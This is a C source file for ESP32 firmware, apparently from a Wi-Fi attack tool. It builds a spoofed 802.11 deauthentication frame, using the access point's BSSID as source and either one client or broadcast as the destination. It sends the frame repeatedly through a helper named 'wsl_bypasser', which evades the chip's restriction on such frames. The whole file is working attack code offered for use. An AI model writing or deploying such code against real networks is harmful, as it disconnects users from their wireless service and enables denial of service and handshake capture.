#include "esp_log.h"
#include "esp_wifi.h"
#include "wsl_bypasser.h"
#include <string.h>

// If client_mac is NULL, send broadcast deauth
void send_deauth_packet(const uint8_t *ap_bssid, const uint8_t *client_mac) {
  uint8_t deauth_frame[26] = {
      0xC0, 0x00,             // Frame Control: Deauth
      0x00, 0x00,             // Duration
      0,    0,    0, 0, 0, 0, // Destination MAC (will fill later)
      0,    0,    0, 0, 0, 0, // Source MAC (AP BSSID)
      0,    0,    0, 0, 0, 0, // BSSID (AP BSSID)
      0x00, 0x00,             // Sequence Control
      0x07, 0x00              // Reason Code
  };

  // Destination MAC: either client or broadcast
  if (client_mac) {
    memcpy(&deauth_frame[4], client_mac, 6);
  } else {
    memset(&deauth_frame[4], 0xFF, 6); // broadcast
  }

  // Source MAC and BSSID = AP BSSID
  memcpy(&deauth_frame[10], ap_bssid, 6);
  memcpy(&deauth_frame[16], ap_bssid, 6);
  // print size of deauth_frame

  // Transmit the frame
  // Enable monitor mode
  for (int i = 0; i < 15; i++) {
    // esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame),
    // false);
    wsl_bypasser_send_deauth_frame(ap_bssid, client_mac);
    vTaskDelay(pdMS_TO_TICKS(500)); // Delay to avoid flooding
  }
}
